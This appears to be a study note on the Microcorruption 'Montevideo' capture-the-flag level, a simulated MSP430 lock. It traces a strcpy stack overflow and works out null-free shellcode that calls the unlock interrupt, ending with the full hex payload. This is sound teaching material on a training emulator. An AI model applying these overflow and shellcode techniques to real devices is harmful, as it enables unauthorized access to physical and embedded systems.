---
id: study-microcorruption-montevideo
aliases: []
tags:
  - microcorruption
  - montevideo
---

# Microcorruption

[Microcorruption](https://www.microcorruption.com) CTF is a capture the flag (CTF) competition designed to teach
low-level reverse engineering by pitting the user against a lock mechanism
running on a simulated MSP430 controller. The user exploits MSP430 assembly
to gain access to the device and unlock the door.

## Microcorruption (Montevideo)

- This is Software Revision 03. We have received unconfirmed reports
  of issues with the previous series of locks. We have reimplemented
  much of the code according to our internal Secure Development
  Process.

## Long Passwords

Let's test a long input: `0102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F`

This stores the input starting at `0x43EE` and allows input up to `0x441E` (48 bytes)

## `<main>`

```assembly
call  #0x44f4 <login>
```

## `<login>`

```assembly
call  #0x4446 <conditional_unlock_door>
tst   r15
jz    $+0x8 <login+0x48>
mov   #0x44c5 "Access granted.", r15
jnz   $+0x6 <login+0x4c>
mov   #0x44d5 "That password is not correct.", r15
call  #0x45b0 <puts>
add   #0x10, sp
ret
```

Investigating for the previous weakness found in the [Whitehorse](https://bryan-melanson.github.io/blog/articles/microcorruption-06-whitehorse.html) exercise, when
overflowing the input buffer with the above string the `<login>` function
returns to whatever is in the 17-18 bytes (`0x1211` in our case).

But trying the previous solution `30127f00b0123245090A0B0C0D0E0F101112` the program
returns to `0x443C`. Something in the string is handled differently than the
test input.

## `<strcpy>`

```assembly
mov     r15, r13
jmp     $+0x6 <strcpy+0x8>
inc     r14
inc     r13
mov.b   @r14, r12
mov.b   r12, 0x0(r13)
tst.b   r12                   ; Is the byte 0x00?
jnz     $-0xc <strcpy+0x4>    ; If not jump back and get the next
ret
```

The function that copies the input runs until it hits an `0x00`, which ends the input.

Removing the `00` from the input returns to the `0x1211` address, so the shell code
needs some altering to get this to run.

## Changing Shell Code

The [Whitehorse](https://bryan-melanson.github.io/blog/articles/microcorruption-06-whitehorse.html) solution used this code to execute the door unlock interrupt:

```assembly
push  #0x7f
call  #0x4532 ; <INT>
```

But the disassembled form of this code has a `0x00` byte that causes the input
buffer to cut off: `30127f00b0123245`

The `<INT>` function uses the current value pushed to the SP as its arg, so to
get around the `0x00` byte that `#0x7F` or `#0x007F` as the 16-bit architecture
interprets it, we have to use 16-bit immediate values as our inputs to generate
the `0x7F` byte. We'll use R6, which is unused, to calculate the value.

```assembly
clr     r6              ; R6 = 0x0000
add     #0xEFEF, r6     ; R6 = 0x0000 + 0xEFEF = 0xEFEF
add     #0x1090, r6     ; R6 = 0xEFEF + 0x1090 = 0x007F (wraps to 16-bit)
push    r6              ; push 0x007F
call    #0x454C         ; <INT>
```

Which is `06433650efef365090100612b0124c45` (16 bytes). Adding the address bytes to 17-18 should allow us to execute the shell code.

## Solution

`06433650efef365090100612b0124c45EE43`
